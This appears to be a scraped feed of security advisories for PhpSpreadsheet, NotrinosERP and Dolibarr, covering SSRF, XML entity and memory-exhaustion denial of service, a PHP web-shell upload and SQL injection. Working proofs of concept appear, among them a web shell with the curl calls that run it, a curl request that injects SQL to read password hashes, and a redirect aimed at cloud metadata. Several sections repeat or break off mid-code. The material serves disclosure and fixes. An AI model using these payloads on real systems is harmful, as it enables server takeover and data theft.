description: Security Advisory for PHP packages hosted at packagist.org on GitHub

items.content_html:
Summary

PhpSpreadsheet's Worksheet\Drawing::setPath() validates an external-image URL against an operator-supplied isWhitelisted callback once, on the initial URL only, then fetches it with file_get_contents() using a stream context that does not set follow_location => 0. A whitelisted host that returns an HTTP 302 Location: redirect to an internal target is therefore followed by PHP's HTTP wrapper (default follow_location=1, max_redirects=20) with no re-validation of the redirect hop — defeating the whitelist and yielding a blind SSRF from the server.

This is an unfixed variant of CVE-2026-59931 (GHSA-6hq5-7373-42rg, the WEBSERVICE redirect-whitelist-bypass): the follow_location => 0 fix (commit 7ef7b25e) was applied ONLY to Calculation/Web/Service.php; Worksheet/Drawing.php was never touched.

Root Cause

src/PhpSpreadsheet/Worksheet/Drawing.php:

  • Scheme allowlist at :125 (/^(http|https|file|ftp|s3):/) permits http/https (the redirect-following schemes) and runs on the initial URL only.
  • Opt-in gate if (!$allowExternal) at :128 (requires setAllowExternalImages(true); default false, BaseReader.php:55).
  • Whitelist check if ($isWhitelisted !== null && !$isWhitelisted($path)) at :131 — validates the INITIAL URL only; never re-applied after a redirect.
  • Stream context built at :140-152 sets user_agent + header (+ ssl.crypto_method for https) but omits follow_location. git grep follow_location on tag 5.9.0 yields a single hit — Service.php:45 (the CVE-2026-59931 fix) — confirming it was never added to Drawing.php.
  • Sink file_get_contents($path, false, $ctx) at :154.

Impact

Blind SSRF from the server: reach and trigger internal GET-driven endpoints, coarse internal reachability/port probing, and reach cloud-metadata endpoints. The fetched body is written to a temp file, checked with isImage() (mime image/*, or application/octet-stream with bin/emf extension), only image dimensions are stored, and the temp file is unlinked — so the response body is not exfiltrated (non-image responses fail isImage()). This is a blind GET primitive, not full response read.

Proof of Concept

  1. Attacker server https://trusted-whitelisted.example/redir.png returns 302 Location: http://169.254.169.254/latest/meta-data/.
  2. evil.xlsx with xl/drawings/_rels/drawing1.xml.rels: <Relationship ... Type=".../image" Target="https://trusted-whitelisted.example/redir.png" TargetMode="External"/>.
  3. Victim: $r = new Xlsx(); $r->setAllowExternalImages(true)->setIsWhitelisted(fn($p)=>str_contains($p,'trusted-whitelisted.example')); $r->load('evil.xlsx'); -> the server-side GET is forced to the internal target despite the whitelist. HTML-reader variant: <img src="https://trusted-whitelisted.example/redir.png"> loaded via Reader\Html (Html.php:1237) with the same reader settings.

Attack Chain

  1. Entry: crafted evil.xlsx, xl/drawings/_rels/*.rels TargetMode="External", Target="https://trusted.example/redir.png" (whitelisted host). Guard: none (legal external-image relationship). Bypass proof: Target stored verbatim -> $url at Reader/Xlsx.php:1544.
  2. Config: victim loads with setAllowExternalImages(true)->setIsWhitelisted($cb) where $cb allows trusted.example. Guard: Drawing.php:128 opt-in (satisfied) + :131 whitelist. Bypass proof: initial URL is whitelisted -> returns true; check runs once on $path.
  3. Fetch/redirect: file_get_contents (:154) GETs the URL; whitelisted host returns 302 Location: http://169.254.169.254/.... Guard: stream context (:140-152). Bypass proof: no follow_location key -> PHP follows the redirect (default follow_location=1, max_redirects=20) with no re-validation.
  4. Impact: server issues a blind GET to the internal target (body temp-filed, isImage()-checked, dimensions stored, temp file unlinked — body not exfiltrated).

Bypass Evidence

  • git grep follow_location 5.9.0 -- src/ -> single hit at Service.php:45; Drawing.php has none.
  • CVE-2026-59931's own regression harness (ServerTest.php + redirect.php: a whitelisted host 302-redirects to direct.php; only after follow_location => 0 does the fetch stop following it) demonstrates the exact behavior. That fix is present in Service.php and absent in Drawing.php.
  • git grep isWhitelisted 5.9.0 -- src/ confirms the callback is applied only at Drawing.php:131 (initial $path), never after the redirect.

Affected Versions

>= 5.5.0, <= 5.9.0. The isWhitelisted control being bypassed was introduced in 5.5.0 (commit 50a7552f); present and unfixed on the latest release (5.9.0) and on HEAD (05e99ebf). No post-release fix to Drawing.php.

Add 'follow_location' => 0 (and/or 'max_redirects' => 0) to $ctxArray['http'] in Drawing::setPath() (:140-148), mirroring the CVE-2026-59931 fix at Service.php:45; alternatively follow redirects manually and re-run $isWhitelisted on each hop.

Summary

When PhpSpreadsheet loads an OpenDocument Spreadsheet (.ods), Ods::processTableRow() reads the table:number-rows-repeated attribute of a <table:table-row> with an unchecked (int) cast, then materialises one cell per repeated row. This value is completely unbounded, so a single ~1.4 KB file can instruct the reader to create up to millions of cells, exhausting memory (fatal OOM). No authentication, no special configuration, and the default read filter are required - any application that loads a user-supplied .ods is affected.

Affected versions

The number-rows-repeated expansion has existed in the ODS reader since its inception (pre-dating the current release branches), so all maintained lines are affected.

Branch Affected
1.x ≤ 1.30.6
2.0–2.1 ≤ 2.1.18
2.2–2.4 ≤ 2.4.7
3.x ≤ 3.10.7
4.x–5.x ≤ 5.9.0 (latest)

Root cause (source → sink)

src/PhpSpreadsheet/Reader/Ods.php:

// line 816 — row repeat, unchecked (int) cast
$rowRepeats = (int) $childNode->getAttributeNS($tableNs, 'number-rows-repeated');
...
// line 1151 — row materialisation loop: NO upper bound
for ($rowAdjust = 0; $rowAdjust < $rowRepeats; ++$rowAdjust) {
    $rID = $rowID + $rowAdjust;
    $cell = $spreadsheet->getActiveSheet()->getCell($columnID . $rID);  // allocates a Cell
    $cell->setValueExplicit($dataValue, $type);
    // ... no bounds check on $rowAdjust or $rID ...
}

Why columns are NOT vulnerable (already bounded):

The column-header loop at line 1326 shows the correct pattern with bounds checking:

// line 1326 (processTableColumnHeader): BOUNDED correctly
for ($rowRepeats2 = $rowRepeats; $rowRepeats2 > 0 && $tableColumnIndex2 <= AddressRange::MAX_COLUMN_INT; --$rowRepeats2) {
    // HAS BOUNDS CHECK: && $tableColumnIndex2 <= AddressRange::MAX_COLUMN_INT
}

Additionally, the cell-data column loop at line 1141 calls getCell() which throws exception at Coordinate.php:448 when column exceeds MAX_COLUMN_INT (XFD / 16,384):

// Coordinate.php line 448
if ($columnIndex > self::MAX_COLUMN_INT) {
    throw new Exception('Column string index can not be beyond XFD');
}

  • Result: OOM at default memory limit

  </table:table-cell>

   <text:p>1</text:p>

Summary

When PhpSpreadsheet loads an OpenDocument Spreadsheet (.ods), Ods::processTableRow() reads the table:number-rows-repeated attribute of a <table:table-row> with an unchecked (int) cast, then materialises one cell per repeated row. This value is completely unbounded, so a single ~1.4 KB file can instruct the reader to create up to millions of cells, exhausting memory (fatal OOM). No authentication, no special configuration, and the default read filter are required - any application that loads a user-supplied .ods is affected.

Affected versions

The number-rows-repeated expansion has existed in the ODS reader since its inception (pre-dating the current release branches), so all maintained lines are affected.

Branch Affected
1.x ≤ 1.30.6
2.0–2.1 ≤ 2.1.18
2.2–2.4 ≤ 2.4.7
3.x ≤ 3.10.7
4.x–5.x ≤ 5.9.0 (latest)

Root cause (source → sink)

src/PhpSpreadsheet/Reader/Ods.php:

// line 816 — row repeat, unchecked (int) cast
$rowRepeats = (int) $childNode->getAttributeNS($tableNs, 'number-rows-repeated');
...
// line 1151 — row materialisation loop: NO upper bound
for ($rowAdjust = 0; $rowAdjust < $rowRepeats; ++$rowAdjust) {
    $rID = $rowID + $rowAdjust;
    $cell = $spreadsheet->getActiveSheet()->getCell($columnID . $rID);  // allocates a Cell
    $cell->setValueExplicit($dataValue, $type);
    // ... no bounds check on $rowAdjust or $rID ...
}

Why columns are NOT vulnerable (already bounded):

The column-header loop at line 1326 shows the correct pattern with bounds checking:

// line 1326 (processTableColumnHeader): BOUNDED correctly
for ($rowRepeats2 = $rowRepeats; $rowRepeats2 > 0 && $tableColumnIndex2 <= AddressRange::MAX_COLUMN_INT; --$rowRepeats2) {
    // HAS BOUNDS CHECK: && $tableColumnIndex2 <= AddressRange::MAX_COLUMN_INT
}

Additionally, the cell-data column loop at line 1141 calls getCell() which throws exception at Coordinate.php:448 when column exceeds MAX_COLUMN_INT (XFD / 16,384):

// Coordinate.php line 448
if ($columnIndex > self::MAX_COLUMN_INT) {
    throw new Exception('Column string index can not be beyond XFD');
}

Result: Columns are capped at 16,384. Only rows are unbounded.

Impact

Memory exhaustion (single valued cell, repeated many rows):
A non-null cell value with a huge number-rows-repeated attribute materialises millions of Cell objects → PHP fatal Allowed memory size ... exhausted.

Example:

  • Payload: <table:table-row table:number-rows-repeated="5000000"> (5 million rows)
  • File size: 1.4 KB
  • Memory consumed: ~256 MB (one Cell object per row)
  • Result: OOM at default memory limit

<table:table table:name="Sheet1">
 <table:table-row table:number-rows-repeated="5000000">
  <table:table-cell office:value-type="float" office:value="1">
   <text:p>1</text:p>
  </table:table-cell>

</table:table>

Not vulnerable (for reference - throws exception):

<table:table table:name="Sheet1">

  <table:table-cell office:value-type="float" office:value="1"
      table:number-columns-repeated="1000000000">
   <text:p>1</text:p>
  </table:table-cell>
 </table:table-row>
</table:table>

This column-repeat example throws Column string index can not be beyond XFD exception (bounded defense, already in place).

The vulnerability exists in src/PhpSpreadsheet/Reader/Security/XmlScanner.php, method scan(), lines 87–100.

The scanner builds a regex pattern /\0*<\0*!\0*D\0*O\0*C\0*T\0*Y\0*P\0*E\0*/ that only handles NULL byte interleaving.   • ISO-2022-JP (ESC ( B)
  • ISO-2022-JP-2 (ESC $ B)
  • ISO-2022-KR (ESC $ ) C)
  • ISO-2022-CN (ESC $ ) A)
  • ISO-2022-CN-EXT (ESC $ ) G)
  • ISO-2022-JP-2004 (ESC $ ( Q)

    . $doctype . ' sst [' . "\n"
    . '  <!ENTITY big "' . $entity_value . '">' . "\n"
    . ']>' . "\n"

items.content_html:
Summary

The SpreadsheetML XML reader (Reader\Xml) scans file content twice through XmlScanner::scan(), and each scan runs an unentity() callback that calls html_entity_decode() after the pattern check. By double-encoding the < character as &#60;, the first scan decodes & to & (forming <), and the second scan decodes < to < (forming <!DOCTYPE). Neither scan's pattern check detects the <!DOCTYPE string because the callback runs after each check. This enables Denial of Service via entity expansion on all PHP versions, and XXE/SSRF on PHP < 8.0 or when LIBXML_NOENT is used.

Details

The vulnerability involves an interaction between three code locations:

1. XmlScanner::scan() (XmlScanner.php, lines 87–108) — checks the pattern before the callback:

public function scan($xml): string
{
    $pattern = '/\0*<\0*!\0*D\0*O\0*...\0*/';

    if (preg_match($pattern, $xml)) {       // CHECK 1 (raw)
        throw new Exception('Detected use of ENTITY...');
    }
    $xml = $this->toUtf8($xml);
    if (preg_match($pattern, $xml)) {       // CHECK 2 (UTF-8)
        throw new Exception('Detected use of ENTITY...');
    }
    if ($this->callback !== null) {
        $xml = call_user_func($this->callback, $xml); // DECODE (after checks!)
    }
    return $xml;  // <!DOCTYPE now present, never checked
}

2. Xml::canRead() (Xml.php, lines 79–117) — scans and stores the result:

$data = file_get_contents($filename);
$data = $this->getSecurityScannerOrThrow()->scan($data); // 1st scan
// ...
$this->fileContents = $data; // stores partially-decoded content

3. Xml::trySimpleXMLLoadStringPrivate() (Xml.php, lines 120–150) — re-scans the stored content:

$data = $this->fileContents; // already partially decoded
$xml = simplexml_load_string(
    $this->getSecurityScannerOrThrow()->scan($data) // 2nd scan finishes decoding
);

The double-scan decode chain:

Raw file:       &#60;!DOCTYPE
                         |
1st scan():     pattern check → no match (no "<" character)
                callback → html_entity_decode(&) = &
                         |
Stored:         <!DOCTYPE
                         |
2nd scan():     pattern check → no match (no "<" character)
                callback → html_entity_decode(<) = <
                         |
Parser sees:    <!DOCTYPE ← never detected by either scan

The unentity() callback (Xml.php, lines 54–61) protects five named entities (& < > " ') via Unicode placeholders, but numeric entities (& < & <) are not protected and are decoded by html_entity_decode().

Save the following as poc_toctou.php in a directory with PhpSpreadsheet installed via Composer:

<?php
require 'vendor/autoload.php';

// Double-encoded: &#60; survives two scan() passes
// 1st scan callback: & → & (forms <)
// 2nd scan callback: < → < (forms <!DOCTYPE)
$entity_value = str_repeat('A', 100000);
$refs = str_repeat('&big;', 200);

$xml = '<?xml version="1.0"?>' . "\n"
    . '<?mso-application progid="Excel.Sheet"?>' . "\n"
    . '&#60;!DOCTYPE Workbook [' . "\n"
    . '  &#60;!ENTITY big "' . $entity_value . '">' . "\n"
    . ']>' . "\n"
    . '<Workbook xmlns="urn:schemas-microsoft-com:office:spreadsheet"' . "\n"
    . '  xmlns:ss="urn:schemas-microsoft-com:office:spreadsheet">' . "\n"
    . '  <Worksheet ss:Name="Sheet1">' . "\n"
    . '    <Table><Row><Cell><Data ss:Type="String">' . $refs . '</Data></Cell></Row></Table>' . "\n"
    . '  </Worksheet>' . "\n"

Summary

The SpreadsheetML XML reader (Reader\Xml) scans file content twice through XmlScanner::scan(), and each scan runs an unentity() callback that calls html_entity_decode() after the pattern check. By double-encoding the < character as &#60;, the first scan decodes & to & (forming <), and the second scan decodes < to < (forming <!DOCTYPE). Neither scan's pattern check detects the <!DOCTYPE string because the callback runs after each check. This enables Denial of Service via entity expansion on all PHP versions, and XXE/SSRF on PHP < 8.0 or when LIBXML_NOENT is used.

Details

The vulnerability involves an interaction between three code locations:

1. XmlScanner::scan() (XmlScanner.php, lines 87–108) — checks the pattern before the callback:

public function scan($xml): string
{
    $pattern = '/\0*<\0*!\0*D\0*O\0*...\0*/';

    if (preg_match($pattern, $xml)) {       // CHECK 1 (raw)
        throw new Exception('Detected use of ENTITY...');
    }
    $xml = $this->toUtf8($xml);
    if (preg_match($pattern, $xml)) {       // CHECK 2 (UTF-8)
        throw new Exception('Detected use of ENTITY...');
    }
    if ($this->callback !== null) {
        $xml = call_user_func($this->callback, $xml); // DECODE (after checks!)
    }
    return $xml;  // <!DOCTYPE now present, never checked
}

2. Xml::canRead() (Xml.php, lines 79–117) — scans and stores the result:

$data = file_get_contents($filename);
$data = $this->getSecurityScannerOrThrow()->scan($data); // 1st scan
// ...
$this->fileContents = $data; // stores partially-decoded content

3. Xml::trySimpleXMLLoadStringPrivate() (Xml.php, lines 120–150) — re-scans the stored content:

$data = $this->fileContents; // already partially decoded
$xml = simplexml_load_string(
    $this->getSecurityScannerOrThrow()->scan($data) // 2nd scan finishes decoding
);

The double-scan decode chain:

Raw file:       &#60;!DOCTYPE
                         |
1st scan():     pattern check → no match (no "<" character)
                callback → html_entity_decode(&) = &
                         |
Stored:         <!DOCTYPE
                         |
2nd scan():     pattern check → no match (no "<" character)
                callback → html_entity_decode(<) = <
                         |
Parser sees:    <!DOCTYPE ← never detected by either scan

The unentity() callback (Xml.php, lines 54–61) protects five named entities (& < > " ') via Unicode placeholders, but numeric entities (& < & <) are not protected and are decoded by html_entity_decode().

PoC

Save the following as poc_toctou.php in a directory with PhpSpreadsheet installed via Composer:

<?php
require 'vendor/autoload.php';

// Double-encoded: &#60; survives two scan() passes
// 1st scan callback: & → & (forms <)
// 2nd scan callback: < → < (forms <!DOCTYPE)
$entity_value = str_repeat('A', 100000);
$refs = str_repeat('&big;', 200);

$xml = '<?xml version="1.0"?>' . "\n"
    . '<?mso-application progid="Excel.Sheet"?>' . "\n"
    . '&#60;!DOCTYPE Workbook [' . "\n"
    . '  &#60;!ENTITY big "' . $entity_value . '">' . "\n"
    . ']>' . "\n"
    . '<Workbook xmlns="urn:schemas-microsoft-com:office:spreadsheet"' . "\n"
    . '  xmlns:ss="urn:schemas-microsoft-com:office:spreadsheet">' . "\n"
    . '  <Worksheet ss:Name="Sheet1">' . "\n"
    . '    <Table><Row><Cell><Data ss:Type="String">' . $refs . '</Data></Cell></Row></Table>' . "\n"
    . '  </Worksheet>' . "\n"
    . '</Workbook>';

file_put_contents('poc.xml', $xml);
echo "File size: " . filesize('poc.xml') . " bytes\n";

$mem_before = memory_get_usage(true);
$reader = new \PhpOffice\PhpSpreadsheet\Reader\Xml();
echo "canRead: " . ($reader->canRead('poc.xml') ? 'true' : 'false') . "\n";
$spreadsheet = $reader->load('poc.xml');
$peak = memory_get_peak_usage(true);

echo "Peak memory: " . round($peak / 1024 / 1024, 1) . " MB\n";

$val = $spreadsheet->getActiveSheet()->getCell('A1')->getValue();

Summary

An authenticated user with the HR "Manage Employees" permission (SA_EMPLOYEE) can upload a file with an arbitrary extension through the employee Documents tab. The handler writes the raw client-supplied filename — extension intact — into a web-served directory with no extension, MIME, or content validation, so a .php file is stored under the web root and executes as code, yielding remote code execution on the server.

Details

The document-upload branch in hrm/manage/employees.php (function tab_documents()) moves the uploaded file using the client filename verbatim:

// hrm/manage/employees.php -> tab_documents()  (HEAD lines 597-602; release 1.0.0 lines 568-573)
$upload_dir = company_path().'/documents/employees';
if (!file_exists($upload_dir))
    mkdir($upload_dir, 0777, true);
$file_path = $upload_dir.'/'.$employee_id.'_'.time().'_'.$_FILES['doc_file']['name'];
if (!move_uploaded_file($_FILES['doc_file']['tmp_name'], $file_path)) { ... }

There is no extension allow-list, getimagesize(), MIME check, or content inspection on this path. Contrast this with the profile-photo (pic) upload in the same file, which validates image type/extension/size, and with core includes/ui/attachment.inc, which deliberately generates a random extension-less name (uniqid()) with a comment warning that client filenames must never be trusted. The document handler ignores that established safe pattern.

Reachability of the written file:

  • company_path() resolves under the web root; config.default.php sets $comp_path = $path_to_root.'/company', so uploads land in company/0/documents/employees/.
  • The only .htaccess in the project is the repo-root one, which denies .inc/.po/.sh/.pem/.sql/.log only — it does not block .php and does not cover company/.
  • The stored path is then echoed unescaped into a clickable "View" link (hrm/includes/ui/employee_ui.inc lines 153-154 — file_path concatenated straight into href), handing the attacker the exact URL of the shell (and creating a secondary stored-XSS sink, CWE-79).

A crafted multipart filename containing ../ additionally enables path traversal (CWE-22) on PHP builds that do not basename ['name'].

Proof of Concept

The upload is gated by authentication and CSRF, but neither gates the file itself. Prerequisites: an authenticated session with SA_EMPLOYEE; an existing employee (employee_no); a valid doc_type_id; and the session CSRF token. The CSRF field is _token (validated by check_csrf_token() against $_SESSION['csrf_token']), so first GET the Documents form to read the hidden _token, then submit. Against your own local instance:

POST /hrm/manage/employees.php?employee_no=1&_tabs_sel=tab_documents HTTP/1.1
Host: <your-local-instance>
Cookie: <authenticated session>
Content-Type: multipart/form-data; boundary=b

--b
Content-Disposition: form-data; name="_token"

<value of the hidden _token field from the GET response>
--b
Content-Disposition: form-data; name="doc_type_id"

<a valid document type id>
--b
Content-Disposition: form-data; name="doc_name"

x
--b
Content-Disposition: form-data; name="doc_file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['c']); ?>
--b
Content-Disposition: form-data; name="save_document"

Save Document
--b--

Then request the stored file (its exact path is shown in the Documents tab's "View" link):

GET /company/0/documents/employees/1_<unix_ts>_shell.php?c=id HTTP/1.1

The command in c executes on the server.

Validation (performed locally, no network)

The code-execution mechanism was confirmed on a local host (PHP 8.5). A harness running the handler's verbatim path/move logic wrote company/0/documents/employees/1_<ts>_shell.php (attacker-chosen .php extension, no validation applied), and requesting it through a PHP web server rooted at the app directory executed the payload:

$ curl '.../company/0/documents/employees/1_1783671979_shell.php?c=id'
uid=501(...) gid=20(staff) ...
$ curl '.../<same>.php?c=uname%20-sm;whoami'
Darwin arm64
<user>

Caveats: (1) the harness used copy() in place of move_uploaded_file() because a CLI process has no real multipart temp file — the client-filename handling and the absence of any validation are identical to production (poc/rce_demo.php); (2) PHP's built-in server executes the file by path, and a standard Apache/mod_php or Nginx+PHP-FPM deployment behaves the same, because the repo-root .htaccess does not block .php and does not cover company/. The full HTTP flow additionally requires the auth + _token + doc_type_id prerequisites above, none of which inspect the file.

Impact

Remote code execution on the hosting server by any authenticated operator holding the delegable SA_EMPLOYEE role (not necessarily an administrator). If a deployment grants SA_EMPLOYEE only to administrators, treat privileges-required as High (CVSS ≈ 7.2).

Suggested fix

  • Never use the client filename on disk. Store with a server-generated name and no executable extension (mirror includes/ui/attachment.inc's uniqid() approach); keep the original name only as a DB label.
  • Enforce an allow-list of document extensions/MIME types and a size cap, exactly like the pic branch already does.
  • Store uploads outside the web root, or drop an .htaccess/web.config in company/*/documents/ that disables script execution (php_admin_flag engine off, RemoveHandler .php, SetHandler none).
  • htmlspecialchars() the stored path before emitting the "View" link (fixes the secondary XSS).

References / credit

  • Affected code: hrm/manage/employees.php, hrm/includes/db/employee_document_db.inc, hrm/includes/ui/employee_ui.inc.
  • Reported by: <Kasper Hong / Kasper Builds>.

References

  • https://github.com/notrinos/NotrinosERP/security/advisories/GHSA-qv4m-m73m-8hj7
  • https://github.com/notrinos/NotrinosERP/commit/71cac7cd199e40cff7f2b18551620133e29f8967
  • https://github.com/notrinos/NotrinosERP/releases/tag/1.1.0
  • https://github.com/advisories/GHSA-qv4m-m73m-8hj7

Summary

A SQL Injection vulnerability exists in the Third Party (Company) update functionality of Dolibarr ERP/CRM. The localtax1_value parameter (lt1) is concatenated directly into an SQL UPDATE statement in societe/class/societe.class.php at line 1672 without any escaping, type casting, or parameterized query binding.

An authenticated user with standard "Third Party: Create/Edit" permission can extract any data from the database, including password hashes, API keys, and all business data.

Tested on Dolibarr v23.0.0 (latest stable), default installation via official Docker image, MariaDB 10.11. No custom modules, no modified configuration.

Details

Vulnerable code (societe/class/societe.class.php, line 1672):

$sql .= ",localtax1_value =".$this->localtax1_value;

The value comes from GETPOST('lt1', 'alpha') (societe/card.php, line 1135). The only sanitization applied is trim() at line 1528 — no (float) cast, no $db->escape().

The alpha input filter strips HTML tags and double quotes but does not strip single quotes, parentheses, commas, or SQL keywords. Since the injection point is in a numeric SQL context (no quotes around the value), the attacker needs none of the filtered characters.

Why the WAF does not block this: Dolibarr's WAF (waf.inc.php) only checks SQL injection patterns in GET parameters, not POST. The POST-based lt1 parameter bypasses it entirely.

The same vulnerability exists for localtax2_value (parameter lt2) at line 1682.

Adjacent fields like localtax1_assuj are properly cast to (int), showing the developers were aware of injection risk but missed these fields.

PoC

Steps to reproduce:

  1. Install Dolibarr v23.0.0 (tested with official Docker image, MariaDB 10.11)
  2. Log in with a user that has "Third Parties: Create/Edit" permission (standard user, not admin)
  3. Create or open any existing Third Party (company) record
  4. Click "Edit" on the company card to open the update form
  5. Intercept the POST request (e.g., Burp Suite) and add these parameters to the request body:
    • localtax1assuj_value=1
    • lt1=1,note_private=(SELECT pass_crypted FROM llx_user WHERE rowid=1)
  6. Submit the form (server responds with HTTP 302 Found — successful update)
  7. Navigate to the company's Notes tab — the admin's MD5 password hash is now visible in the "Private Note" field

Verification: echo -n "admin123" | md5sum → 0192023a7bbd73250516f069df18b500 (matches exfiltrated hash).

Figure 1 — Notes tab before exploitation (Private Note field is empty):

Figure 2 — Burp Suite Repeater: full POST request headers and HTTP 302 Found response:

Figure 3 — Burp Suite Repeater: request body with injected localtax1assuj_value=1 and lt1=1,note_private=(SELECT pass_crypted FROM llx_user WHERE rowid=1):

Figure 4 — Notes tab after exploitation: Private Note now contains 0192023a7bbd73250516f069df18b500 (MD5 hash of admin password "admin123"):

curl PoC:

curl -b cookies.txt \
  --data-urlencode "action=update" \
  --data-urlencode "token=CSRF_TOKEN" \
  --data-urlencode "socid=1" \
  --data-urlencode "name=TestCompany" \
  --data-urlencode "status=1" \
  --data-urlencode "localtax1assuj_value=1" \
  --data-urlencode "lt1=1,note_private=(SELECT pass_crypted FROM llx_user WHERE rowid=1)" \
  --data-urlencode "client=1" \
  --data-urlencode "typent_id=0" \
  "http://TARGET/societe/card.php?socid=1"

Additional proof — arithmetic evaluation: Sending lt1=3+4 results in localtax1_value=7.0000 stored in the database. The expression was evaluated by the SQL engine, confirming injection.

Additional proof — user count exfiltration: Sending lt1=(SELECT COUNT(*) FROM llx_user) results in localtax1_value=1.0000.

Impact

An attacker with basic "Third Party: Create/Edit" permission (standard user, not admin) can:

  • Read any data from the database (password hashes, API keys, customer/supplier data, invoices, bank account details)
  • Modify any database record via additional SET clauses in the UPDATE injection
  • Escalate to admin by cracking MD5 password hashes (Dolibarr uses unsalted MD5 by default)
  • Potentially achieve RCE via admin features (Website module PHP injection, ModuleBuilder) after privilege escalation

Suggested Fix

// societe.class.php, line 1528 — add (float) cast:
$this->localtax1_value = (float) price2num(trim($this->localtax1_value));

// societe.class.php, line 1672 — add (float) cast:
$sql .= ",localtax1_value =".((float) $this->localtax1_value);

Apply same fix for localtax2_value (lines 1529, 1682).

Credit

Please credit this finding to: Grzegorz Tworek (F3715H) sec4check (grzegorz.tworek@sec4check.pl)

References

A detailed write-up will be published after patch release at: https://www.sec4check.pl/blog/posts/cve-dolibarr-sql-injection-localtax-third-party.html

We kindly request including this URL in the CVE references.

  • https://www.sec4check.pl/blog/posts/cve-dolibarr-sql-injection-localtax-third-party.html
  • https://github.com/advisories/GHSA-v5fq-cf5m-vwv7

items.content_html:
Summary

The SpreadsheetML XML reader (Reader\Xml) does not validate the ss:Index row attribute against the maximum allowed row count (AddressRange::MAX_ROW = 1,048,576). An attacker can craft a SpreadsheetML XML file with ss:Index="999999999" on a <Row> element, which inflates the internal cachedHighestRow to ~1 billion. Any subsequent call to getRowIterator() without an explicit end row will attempt to iterate ~1 billion rows, causing CPU exhaustion and denial of service.

Details

In src/PhpSpreadsheet/Reader/Xml.php, the loadSpreadsheetFromFile method processes <Row> elements:

// Xml.php:397-402
if (isset($row_ss['Index'])) {
    $rowID = (int) $row_ss['Index']; // No validation against MAX_ROW
}
if (isset($row_ss['Hidden'])) {
    $rowVisible = ((string) $row_ss['Hidden']) !== '1';
    $spreadsheet->getActiveSheet()->getRowDimension($rowID)->setVisible($rowVisible);
}

The $rowID value read from ss:Index is cast to int with no upper bound check. It is then passed to getRowDimension():

// Worksheet.php:1342-1351
public function getRowDimension(int $row): RowDimension
{
    if (!isset($this->rowDimensions[$row])) {
        $this->rowDimensions[$row] = new RowDimension($row);
        $this->cachedHighestRow = max($this->cachedHighestRow, $row);
    }
    return $this->rowDimensions[$row];
}

This inflates cachedHighestRow to the attacker-controlled value. Additionally, at line 412, $cellRange = $columnID . $rowID is constructed and passed to getCell(), which calls createNewCell() (Worksheet.php:1294) and also sets cachedHighestRow.

The RowIterator constructor uses getHighestRow() as its default end row:

// RowIterator.php:84-88
public function resetEnd(?int $endRow = null): static
{
    $this->endRow = $endRow ?: $this->subject->getHighestRow();
    return $this;
}

With cachedHighestRow at ~1 billion, iterating over rows causes CPU exhaustion. The DefaultReadFilter provides no protection — it returns true for all cells.

Even without the Hidden attribute, any cell data within the row still uses the inflated $rowID at line 412, so the ss:Hidden attribute is not required to trigger the vulnerability.

PoC

  1. Create poc.xml:
<?xml version="1.0"?>
<?mso-application progid="Excel.Sheet"?>
<Workbook xmlns="urn:schemas-microsoft-com:office:spreadsheet"
 xmlns:ss="urn:schemas-microsoft-com:office:spreadsheet">
 <Worksheet ss:Name="Sheet1">
  <Table>
   <Row ss:Index="999999999" ss:Hidden="1"/>
   <Row><Cell><Data ss:Type="String">test</Data></Cell></Row>
  </Table>
 </Worksheet>
</Workbook>
  1. Load and iterate:
<?php
require 'vendor/autoload.php';
use PhpOffice\PhpSpreadsheet\IOFactory;

$reader = IOFactory::createReader('Xml');
$spreadsheet = $reader->load('poc.xml');
$sheet = $spreadsheet->getActiveSheet();

echo "Highest row: " . $sheet->getHighestRow() . "\n";
// Outputs: Highest row: 1000000000

// This loop will attempt ~1 billion iterations → CPU exhaustion
foreach ($sheet->getRowIterator() as $row) {
    // Never completes
}

Impact

Any PHP application that processes user-uploaded SpreadsheetML XML files using PhpSpreadsheet is vulnerable. An attacker can cause denial of service by:

  • Exhausting server CPU with a single small XML file (~300 bytes)
  • Blocking the PHP worker process, potentially affecting all concurrent users
  • Triggering PHP max_execution_time limits that still consume resources before killing the process

The attack requires no authentication — only the ability to upload or cause the application to process a crafted SpreadsheetML file.

Recommended Fix

Add MAX_ROW validation after reading the ss:Index attribute in src/PhpSpreadsheet/Reader/Xml.php:

// After line 398:
if (isset($row_ss['Index'])) {
    $rowID = (int) $row_ss['Index'];
    if ($rowID > AddressRange::MAX_ROW) {
        $rowID = AddressRange::MAX_ROW;
    }
}

Add the necessary import at the top of the file:

use PhpOffice\PhpSpreadsheet\Cell\AddressRange;

The same validation should also be applied to the ss:Index attribute on <Cell> elements (line 409) for the column dimension.

References

  • https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-84wq-86v6-x5j6
  • https://nvd.nist.gov/vuln/detail/CVE-2026-40863
  • https://github.com/advisories/GHSA-84wq-86v6-x5j6
